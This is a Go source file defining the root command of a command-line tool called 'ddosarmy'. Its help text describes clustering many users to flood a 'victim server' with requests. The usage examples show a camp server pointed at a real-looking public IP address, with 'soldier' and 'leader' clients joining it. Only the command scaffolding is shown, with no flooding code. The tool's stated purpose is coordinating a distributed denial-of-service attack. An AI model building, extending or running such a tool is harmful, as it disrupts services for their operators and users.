package cmd

import (
	"github.com/fatih/color"
	"os"

	"github.com/spf13/cobra"
)

var rootCmd = &cobra.Command{
	Use:   "ddosarmy",
	Short: "connect to a server and send a lot of requests :)",
	Long: color.CyanString(`
ddos army is tool aims to cluster multiple users
to send a lot of requests to a victim server`),
	Example: color.MagentaString(`
- start camp server with:

	ddosarmy`) + color.CyanString(" server ") + color.MagentaString(`-v 142.251.37.46:433

- make soldier join camp server with :

	ddosarmy`) + color.CyanString(" soldier ") + color.MagentaString(`-c 10.0.0.10:8080 

- leader join camp server with:

	ddosarmy `) + color.CyanString(" leader ") + color.MagentaString(` -c 10.0.0.10:8080 -s password
`),
}

func Execute() {
	err := rootCmd.Execute()
	if err != nil {
		os.Exit(1)
	}
}

func init() {

}
